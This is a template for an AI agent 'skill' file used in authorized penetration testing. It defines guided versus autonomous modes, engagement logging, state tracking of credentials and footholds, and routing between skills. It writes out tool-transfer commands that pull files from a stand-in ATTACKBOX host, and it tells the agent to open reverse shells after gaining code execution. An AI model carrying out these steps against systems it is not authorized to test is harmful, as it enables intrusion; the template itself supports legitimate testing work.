---
name: <skill-name>
description: >
  <What this skill does in 2-3 sentences. Focus on technique scope and when
  to use it. No trigger phrases, negative conditions, or OPSEC details here.>
keywords:
  - <operator search term>
  - <technique name or acronym>
  - <tool name that implies this technique>
tools:
  - <tool1>
  - <tool2>
opsec: <low|medium|high>
---

# <Skill Display Name>

You are helping a penetration tester with <technique description>. All testing
is under explicit written authorization.

## Mode

Check if the user or orchestrator has set a mode:
- **Guided** (default): Before executing any command that sends traffic to a
  target, present the command with a one-line explanation of what it does and
  why. Wait for explicit user approval before executing. Never batch multiple
  target-touching commands without approval — present them one at a time (or as
  a small logical group if they achieve a single objective, e.g., "enumerate SMB
  shares"). Local-only operations (file writes, output parsing, engagement
  logging, hash cracking) do not require approval. At decision forks, present
  options and let the user choose.
- **Autonomous**: Execute end-to-end. Make triage decisions at forks. Report
  findings at milestones. Only pause for destructive or high-OPSEC actions.

If unclear, default to guided.

## Engagement Logging

Check for `./engagement/` directory. If absent:
- **Guided**: Ask if the user wants to initialize an engagement directory.
- **Autonomous**: Create it automatically with `activity.md`, `findings.md`, and
  `evidence/`.

When an engagement directory exists, log as you work:
- **Activity** → append to `engagement/activity.md` at milestones (test confirmed,
  data extracted, finding discovered, pivot to another skill):
  `### [YYYY-MM-DD HH:MM:SS] <skill-name> → <target>` with bullet points of actions and results.
- **Findings** → append to `engagement/findings.md` when a vulnerability is confirmed:
  `## N. Title [Severity]` with target, technique, impact, evidence path, repro command.
- **Evidence** → save significant output to `engagement/evidence/` with descriptive
  filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

If no engagement directory exists and the user declines to create one, proceed normally.

### Invocation Log

Immediately on activation — before reading state.md or doing any assessment —
log invocation to both the screen and activity.md:

1. **On-screen**: Print `[<skill-name>] Activated → <target>` so the operator
   sees which skill is running.
2. **activity.md**: Append:
   ```
   ### [YYYY-MM-DD HH:MM:SS] <skill-name> → <target>
   - Invoked (assessment starting)
   ```

**Timestamps:** Replace `[YYYY-MM-DD HH:MM:SS]` with the actual current date
and time. Run `date '+%Y-%m-%d %H:%M:%S'` to get it. Never write the literal
placeholder `[YYYY-MM-DD HH:MM:SS]` — activity.md entries need real timestamps
with date and second precision for timeline reconstruction.

This entry must be written NOW, not deferred. Subsequent milestone entries
append bullet points under this same header.

## Skill Routing Is Mandatory

When this skill says "Route to **skill-name**" or "→ **skill-name**", you MUST:

1. Call `get_skill("skill-name")` to load the full skill from the MCP skill-router
2. Read the returned SKILL.md content
3. Follow its instructions end-to-end

Do NOT execute the technique inline — even if the attack is trivial or you
already know the answer. Skills contain operator-specific methodology,
client-scoped payloads, and edge-case handling that general knowledge does not.

If you need a skill but don't know the exact name, use
`search_skills("description")` to find it. Before loading a search result,
verify the returned description matches your scenario — embedding similarity
does not guarantee relevance. After loading, check the skill's Prerequisites
and Step 1 against current engagement state before following it.

This applies in both guided and autonomous modes. Autonomous mode means you
make routing decisions without asking — it does not mean you skip skills.

**Scope boundary:** This skill covers <scope>. If your findings lead outside
this scope, STOP — update state.md and route to the appropriate skill. Do not
continue past your scope boundary.

## State Management

If `engagement/state.md` exists, read it before starting. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Write `engagement/state.md` at these checkpoints (not just at completion):
1. **After confirming a vulnerability** — add to Vulns with `[found]`
2. **After successful exploitation** — add credentials, access, pivot paths
3. **Before routing to another skill** — the next skill reads state.md on activation

At each checkpoint and on completion, update the relevant sections of
`engagement/state.md`:
- **Targets**: Add any new hosts, URLs, or services discovered
- **Credentials**: Add any credentials, tokens, or keys recovered
- **Access**: Add or update footholds (shells, sessions, DB access)
- **Vulns**: Add confirmed vulns as one-liners; mark exploited ones `[done]`
- **Pivot Map**: Add new attack paths discovered (X leads to Y)
- **Blocked**: Record what was tried and why it failed

Keep entries compact — one line per item. State.md is a snapshot, not a log.

## Exploit and Tool Transfer

Never download exploits, scripts, or tools directly to the target from the
internet (`curl https://github.com/...`, `git clone` on target). Targets may
lack outbound internet access, and operators must review files before they
reach the target.

**Attackbox-first workflow:**

1. **Download on attackbox** — `git clone`, `curl`, `searchsploit -m` locally
2. **Review** — inspect source code or binary provenance before transferring
3. **Serve** — `python3 -m http.server 8080` from the directory containing the file
4. **Pull from target** — `wget http://ATTACKBOX:8080/file -O /tmp/file` or
   `curl http://ATTACKBOX:8080/file -o /tmp/file`

**Alternatives when HTTP is not viable:** `scp`/`sftp` (if SSH exists),
`nc` file transfer, base64-encode and paste, or
`impacket-smbserver share . -smb2support` on attackbox.

**Inline source code** written via heredoc in this skill does not need this
workflow — the operator can read the code directly.

## Shell Access (when RCE is achieved)

When this skill achieves command execution on a target, **prefer establishing a
reverse shell via the MCP shell-server** over continuing to inject commands
inline (webshell, command injection parameter, SQL xp_cmdshell, etc.).

1. Call `start_listener(port=<port>)` to prepare a catcher
2. Send a reverse shell payload through the current access method
3. Call `list_sessions()` to verify the connection
4. Call `stabilize_shell(session_id=...)` to upgrade to interactive PTY
5. Use `send_command(session_id=..., command=...)` for subsequent commands

**Why**: Interactive shells are more reliable, faster, and required for
privilege escalation tools that spawn new shells (PwnKit, kernel exploits,
sudo abuse). Webshell/injection-based command execution is fragile, slow,
and loses output from interactive programs.

**Exception**: If the target has no outbound connectivity (firewall blocks
reverse connections), fall back to inline command execution and note the
limitation in state.md.

## Prerequisites

- <Required access level or position>
- <Required tools (with install note)>
- <Conditions that must be true>

## Step 1: Assess

If not already provided by the orchestrator or conversation context, determine:
1. <Key info needed>
2. <Key info needed>
3. <Key info needed>

Skip if context was already provided.

## Step 2: Confirm Vulnerability

<How to verify the technique applies. Embedded test payloads.>

## Step 3: Exploit

### Variant A: <Description>

```bash
# Explanation of what this does
command arg1 arg2
```

### Variant B: <Description>

```bash
# Alternative when Variant A fails or is blocked
command arg1 arg2
```

## Step N: Escalate or Pivot

**Before routing**: Write `engagement/state.md` and append to
`engagement/activity.md` with results so far. The next skill reads state.md
on activation — stale state means duplicate work or missed context.

After completing this technique:
- <Outcome 1>: STOP. Route to **<other-skill-name>** — call `get_skill("<other-skill-name>")` and follow its instructions. Pass: <context>. Do not execute <category> commands inline.
- <Outcome 2>: STOP. Route to **<other-skill-name>** — call `get_skill("<other-skill-name>")` and follow its instructions. Pass: <context>. Do not execute <category> commands inline.
- <Outcome 3>: Summarize findings, suggest next steps

When routing, always pass along: injection point, target technology, current
mode, and any payloads that already succeeded.

## Stall Detection

If you have spent **5 or more tool-calling rounds** troubleshooting the same
failure with no meaningful progress — same error, no new information gained,
no change in output — **stop**.

Retrying a command with adjusted syntax, different flags, or additional context
counts as progress. Stalling means repeating the same approach and getting the
same result.

Do not loop. Work through failures systematically:
1. Try each variant or alternative **once**
2. Check the Troubleshooting section for known fixes
3. If nothing changes the outcome after 5 rounds, you are stalled

**When stalled, return to the orchestrator immediately with:**
- What was attempted (commands, variants, alternatives tried)
- What failed and why (error messages, empty responses, timeouts)
- Assessment: **blocked** (permanent — config, patched, missing prereq) or
  **retry-later** (may work with different context, creds, or access)
- Update `engagement/state.md` Blocked section before returning

**Mode behavior:**
- **Guided**: Tell the user you're stalled, present what was tried, and
  recommend the next best path.
- **Autonomous**: Update state.md Blocked section, return findings to the
  orchestrator. Do not retry the same technique — the orchestrator will
  decide whether to revisit with new context or route elsewhere.

## Troubleshooting

### <Common Problem>
<Solution>
